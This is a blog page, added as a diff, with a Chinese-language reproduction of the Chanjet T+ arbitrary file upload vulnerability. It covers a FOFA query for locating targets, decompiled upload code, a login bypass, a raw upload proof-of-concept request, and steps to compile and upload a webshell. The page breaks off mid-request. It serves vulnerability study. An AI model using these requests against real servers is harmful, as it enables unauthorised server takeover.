@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bitbug_favicon.ico">
+  <link rel="icon" href="/img/bitbug_favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="畅捷通属于用友集团企业成员，畅捷通T+适用于异地多组织、多机构对企业财务汇总的管理需求；全面支持企业对远程仓库、异地办事处的管理需求；全面满足企业财务业务一体化管理需求。下载：https:&#x2F;&#x2F;dad.chanapp.chanjet.com&#x2F;TplusYZHJ17.0.zip 资产绘测1fofa：app&#x3D;&quot;畅捷通-TPlus&quot;  漏洞详情畅捷通T+任意文件上传(CNVD-2022">
+<meta property="og:type" content="article">
+<meta property="og:title" content="畅捷通漏洞复现">
+<meta property="og:url" content="http://example.com/2023/04/13/%E7%95%85%E6%8D%B7%E9%80%9AT%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="畅捷通属于用友集团企业成员，畅捷通T+适用于异地多组织、多机构对企业财务汇总的管理需求；全面支持企业对远程仓库、异地办事处的管理需求；全面满足企业财务业务一体化管理需求。下载：https:&#x2F;&#x2F;dad.chanapp.chanjet.com&#x2F;TplusYZHJ17.0.zip 资产绘测1fofa：app&#x3D;&quot;畅捷通-TPlus&quot;  漏洞详情畅捷通T+任意文件上传(CNVD-2022">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2.baidu.com/it/u=827164275,1438983864&fm=253&fmt=auto&app=138&f=GIF?w=500&h=255">
+<meta property="article:published_time" content="2023-04-13T05:44:20.000Z">
+<meta property="article:modified_time" content="2023-11-26T13:17:00.226Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img2.baidu.com/it/u=827164275,1438983864&fm=253&fmt=auto&app=138&f=GIF?w=500&h=255">
+  
+  
+  
+  <title>畅捷通漏洞复现 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>追的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="畅捷通漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-13 13:44" pubdate>
+          2023年4月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          134 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">畅捷通漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>畅捷通属于用友集团企业成员，畅捷通T+适用于异地多组织、多机构对企业财务汇总的管理需求；全面支持企业对远程仓库、异地办事处的管理需求；全面满足企业财务业务一体化管理需求。<br>下载：<code>https://dad.chanapp.chanjet.com/TplusYZHJ17.0.zip</code></p>
+<h2 id="资产绘测"><a href="#资产绘测" class="headerlink" title="资产绘测"></a>资产绘测</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fofa：app=<span class="hljs-string">&quot;畅捷通-TPlus&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><h3 id="畅捷通T-任意文件上传-CNVD-2022-60632-漏洞复现"><a href="#畅捷通T-任意文件上传-CNVD-2022-60632-漏洞复现" class="headerlink" title="畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现"></a>畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>2022年8月29日和8月30日，畅捷通公司紧急发布安全补丁修复了畅捷通T+软件任意文件上传漏洞。未经身份认证的攻击者利用该漏洞，通过绕过系统鉴权，在特定配置环境下实现任意文件的上传，从而执行任意代码，获得服务器控制权限。目前，已有用户被不法分子利用该漏洞进行勒索病毒攻击的情况出现。</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>畅捷通T+单机版&lt;&#x3D;17.0且使用IIS10.0以下版本</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>从其他复现文章看到存在漏洞文件在<code>/SM/SetupAccount/upload.aspx</code>文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686555876557-51e5b973-d632-4e22-8331-389e2d3a274c.png#averageHue=%23faf7f6&clientId=ue694f278-f372-4&from=paste&height=677&id=u3c5b8dbf&originHeight=1016&originWidth=1133&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=135865&status=done&style=none&taskId=ua41e724c-d72d-438d-9aed-5d8eb50d30e&title=&width=755.3333333333334" srcset="/img/loading.gif" lazyload alt="image.png"><br>可以看到这是预编译后的文件，无法正常打开，需要使用反编译软件<code>dsSpy</code>来打开。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686555940659-f3c6bbfc-1d82-4bda-a4ad-12420421d0fa.png#averageHue=%23fbfbfb&clientId=ue694f278-f372-4&from=paste&height=235&id=u3924255b&originHeight=353&originWidth=1221&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16128&status=done&style=none&taskId=u0aab8e90-d7f8-4473-b1c6-e840376739e&title=&width=814" srcset="/img/loading.gif" lazyload alt="image.png"><br>首先来带<code>/bin</code>目录下需按照<code>upload.aspx</code>对应的<code>compiled</code>文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686556873828-4baf9d75-babd-4181-a8e3-c94c6a4a4906.png#averageHue=%23363f49&clientId=ue694f278-f372-4&from=paste&height=460&id=u0d0a019e&originHeight=690&originWidth=1246&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=174268&status=done&style=none&taskId=uaa6371a5-9018-4dc5-8d83-f9a53190957&title=&width=830.6666666666666" srcset="/img/loading.gif" lazyload alt="image.png"><br>得到对应的值：<code>App_Web_uploadimages.aspx.9475d17f</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686556914138-a0a2044d-4e3b-490e-9865-478cc2d88a26.png#averageHue=%23373f48&clientId=ue694f278-f372-4&from=paste&height=282&id=ue5a3a276&originHeight=423&originWidth=1622&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=84644&status=done&style=none&taskId=ubd33adb7-947c-4fe2-b50e-a5fd55b1a04&title=&width=1081.3333333333333" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686556977688-0253df95-56c0-484e-81fd-4aaae445ba9c.png#averageHue=%23f4efed&clientId=ue694f278-f372-4&from=paste&height=301&id=u5a7ad264&originHeight=452&originWidth=1073&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=82357&status=done&style=none&taskId=u236d5112-4c9a-4b6a-9881-3b9ec12efc7&title=&width=715.3333333333334" srcset="/img/loading.gif" lazyload alt="image.png"><br>使用<code>dnSpy</code>打开<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686557194743-0c481376-a1ed-43c5-a5ac-77bce43f77a1.png#averageHue=%23201f1e&clientId=ue694f278-f372-4&from=paste&height=535&id=ue3b1b91b&originHeight=802&originWidth=1816&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=111106&status=done&style=none&taskId=u80513d0e-9e42-4362-b072-d232c94be14&title=&width=1210.6666666666667" srcset="/img/loading.gif" lazyload alt="image.png"><br>整段代码可以看到是非常少的。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-meta"># Page_Load是受限制符保护的函数 void不返回任何值</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Page_Load</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span><br>&#123;<br>    <span class="hljs-meta">#读取资源</span><br>    <span class="hljs-keyword">this</span>.ReadResources();<br>    <span class="hljs-meta"># 如果上传文件计数为1进入循环</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">base</span>.Request.Files.Count == <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-meta">#字符串变量为&quot;images/index.gif&quot;</span><br>        <span class="hljs-built_in">string</span> text = <span class="hljs-string">&quot;images/index.gif&quot;</span>;<br>        <span class="hljs-meta">#获取上传文件名称obj</span><br>        <span class="hljs-built_in">object</span> obj = <span class="hljs-keyword">this</span>.ViewState[<span class="hljs-string">&quot;fileName&quot;</span>];<br>        <span class="hljs-meta">#如果文件民为空，返回字符串。</span><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>)<br>        &#123;<br>            text = obj.ToString();<br>        &#125;<br>        <span class="hljs-meta">#如果文件len长度大于204800返回错误</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.File1.PostedFile.ContentLength &gt; <span class="hljs-number">204800</span>)<br>        &#123;<br>            <span class="hljs-keyword">base</span>.Response.Write(<span class="hljs-built_in">string</span>.Concat(<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[] &#123; <span class="hljs-string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>, <span class="hljs-keyword">this</span>.PhotoTooLarge, <span class="hljs-string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>, text, <span class="hljs-string">&quot;&#x27;;&lt;/script&gt;&quot;</span> &#125;));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-meta">#如果文件type不等于&quot;image/jpeg&quot;、image/bmp、image/gif、image/pjpeg就返回错误</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/bmp&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/gif&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/pjpeg&quot;</span>)<br>        &#123;<br>            <span class="hljs-keyword">base</span>.Response.Write(<span class="hljs-built_in">string</span>.Concat(<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[] &#123; <span class="hljs-string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>, <span class="hljs-keyword">this</span>.PhotoTypeError, <span class="hljs-string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>, text, <span class="hljs-string">&quot;&#x27;;&lt;/script&gt;&quot;</span> &#125;));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-meta">#获取保存的文件名</span><br>        <span class="hljs-built_in">string</span> fileName = <span class="hljs-keyword">this</span>.File1.PostedFile.FileName;<br>        <span class="hljs-meta">#获取文件后缀，\\获取文件路径中最后一个反斜杠的索引位置。通过将索引位置加1,可提取文件名。</span><br>        <span class="hljs-built_in">string</span> text2 = fileName.Substring(fileName.LastIndexOf(<span class="hljs-string">&#x27;\\&#x27;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-meta">#保存文件.获得当前路径加上\\images+上加上文件名。</span><br>        <span class="hljs-keyword">this</span>.File1.PostedFile.SaveAs(<span class="hljs-keyword">base</span>.Server.MapPath(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-string">&quot;\\images\\&quot;</span> + text2);<br>        <span class="hljs-meta">#虚拟路径映射到服务器上相应的物理目录</span><br>        <span class="hljs-built_in">string</span> text3 = <span class="hljs-keyword">base</span>.Server.MapPath(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-string">&quot;\\images\\&quot;</span> + text2;<br>        <span class="hljs-meta">#ViewState读写文件目录到images\文件名</span><br>        <span class="hljs-keyword">this</span>.ViewState[<span class="hljs-string">&quot;fileName&quot;</span>] = <span class="hljs-string">&quot;images/&quot;</span> + text2;<br>        <span class="hljs-meta">#服务器对应目录</span><br>        <span class="hljs-keyword">this</span>.Session[<span class="hljs-string">&quot;ImageName&quot;</span>] = text3;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>访问该文件，提示未登录，寻找权限校验文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192130692-a131d52e-f26e-434d-9377-0830624c28e9.png#averageHue=%23fcfbfb&clientId=u63cc758d-b3d7-4&from=paste&height=828&id=u66807df7&originHeight=1035&originWidth=2038&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179047&status=done&style=none&taskId=ucdfd2b7b-549a-47aa-81a8-e5e78633798&title=&width=1630.4" srcset="/img/loading.gif" lazyload alt="image.png"><br>dnSpy反编译相关程序，翻看代码。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192196391-989da749-f3a4-4dd7-bb57-c08697ef8428.png#averageHue=%234990a0&clientId=u63cc758d-b3d7-4&from=paste&height=716&id=ueb795c58&originHeight=895&originWidth=919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97001&status=done&style=none&taskId=u6a09dc81-a0f9-45e5-892a-349ada50a3a&title=&width=735.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到权限验证代码出，测试一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192257032-e823cc4a-667b-4321-bc4e-ae58f99b1e8b.png#averageHue=%236f8755&clientId=u63cc758d-b3d7-4&from=paste&height=991&id=u42a828c9&originHeight=1239&originWidth=2559&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=360768&status=done&style=none&taskId=u7a231577-3bd2-47ec-8027-c62f1639e85&title=&width=2047.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功绕过登录。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192273126-c0425982-ed41-4d61-8ca8-620476a15d77.png#averageHue=%23fcfcfc&clientId=u63cc758d-b3d7-4&from=paste&height=837&id=ue881379c&originHeight=1046&originWidth=2136&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=196219&status=done&style=none&taskId=u890ac680-32af-4260-b28f-1f7ab103030&title=&width=1708.8" srcset="/img/loading.gif" lazyload alt="image.png"><br>尝试上传文件。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/SM/SetupAccount/Upload.aspx?preload=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">92.0</span><span class="hljs-number">.4515</span><span class="hljs-number">.159</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Cookie: ASP.NET_SessionId=gvigofzulthd2v1i2q5zndtf; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1662302093; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1662302093</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="hljs-comment">Content-Length: 196</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;File1&quot;;filename=&quot;poc.txt&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;h1&gt;te2022st&lt;/h1&gt;</span><br><span class="hljs-comment">------WebKitFormBoundarywwk2ReqGTj7lNYlt--</span><br></code></pre></td></tr></table></figure>
+<p>目录中寻找文件是否成功上传<code>TPlusStd\WebSite\SM\SetupAccount\images</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692343057604-d492c6a9-ddbf-441a-867a-7eb0ba95fc80.png#averageHue=%23faf9f8&clientId=u90732433-3ed4-4&from=paste&height=433&id=ub35852c6&originHeight=650&originWidth=914&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=86780&status=done&style=none&taskId=u5fe4432d-c81c-4bf4-a9b8-2c2ee2a7259&title=&width=609.3333333333334" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692343106753-fd8a9623-47fd-4aaa-8c3a-6b1cc0314e75.png#averageHue=%23fefefd&clientId=u90732433-3ed4-4&from=paste&height=289&id=ubcd98d8d&originHeight=433&originWidth=1312&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22230&status=done&style=none&taskId=ued618bec-9164-4e87-a282-da8ca925d37&title=&width=874.6666666666666" srcset="/img/loading.gif" lazyload alt="image.png"><br>当我们上传aspx文件时，服务器报错未编译文件，尝试编译文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692343152824-a0049877-4195-43db-81d9-f7438c8b271b.png#averageHue=%23f9f3c4&clientId=u90732433-3ed4-4&from=paste&height=468&id=u6dc774e2&originHeight=702&originWidth=1837&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=172474&status=done&style=none&taskId=uffc31446-908d-4e77-8e07-710ca30e39d&title=&width=1224.6666666666667" srcset="/img/loading.gif" lazyload alt="image.png"><br>此时准备一个冰蝎或哥斯拉的木马，进行编译。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">C:\Windows\Microsoft.NET\Framework\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>&gt;aspnet_compiler.exe -v / -p C:\tools C:\<span class="hljs-number">11</span> -fixednames<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692344391646-cd9d1556-ad30-4a81-b2fe-a731438f941b.png#averageHue=%23d3d3d2&clientId=u90732433-3ed4-4&from=paste&height=490&id=u6276b7c5&originHeight=735&originWidth=1937&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=67126&status=done&style=none&taskId=u67572858-0a7c-4c3d-a41c-7f1d406ed9e&title=&width=1291.3333333333333" srcset="/img/loading.gif" lazyload alt="image.png"><br>本地构建一个html上传表单。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">&lt;form action=<span class="hljs-string">&quot;http://192.168.150.176:8080/tplus/sm/setupaccount/upload.aspx?preload=1&quot;</span> name=<span class="hljs-string">&quot;form1&quot;</span> id=<span class="hljs-string">&quot;form1&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;image/jpeg&quot;</span>&gt; <br>    &lt;input name=<span class="hljs-string">&quot;File1&quot;</span> type=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;File1&quot;</span>&gt; &lt;br&gt; <br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">&quot;上 传&quot;</span>&gt; <br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454609632-9194670c-c1e2-4d57-aa5c-949a9a7e1ddd.png#averageHue=%23fbfbfb&clientId=ua5f27331-d912-4&from=paste&height=868&id=uf2a17b55&originHeight=1085&originWidth=2064&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=223532&status=done&style=none&taskId=ueb1c1f08-c5c1-4f1f-ba5e-8e63416c97f&title=&width=1651.2" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454623172-200aea4d-54c5-4fe4-bdc5-eb431f0f7146.png#averageHue=%23fbfbfb&clientId=ua5f27331-d912-4&from=paste&height=841&id=u0c3a6ed1&originHeight=1051&originWidth=2155&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=222086&status=done&style=none&taskId=u707fd5b0-9c60-4cbb-b2a8-e4b42ad874f&title=&width=1724" srcset="/img/loading.gif" lazyload alt="image.png"><br>Request</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/SM/SetupAccount/Upload.aspx?preload=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.176</span>:<span class="hljs-number">8080</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.198</span> Safari/<span class="hljs-number">537.36</span><br>Accept-Encoding: gzip, deflate<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Length: 5839</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=7139a585aa969137b0e6ad1c23dd6a4d</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">--7139a585aa969137b0e6ad1c23dd6a4d</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;File1&quot;; 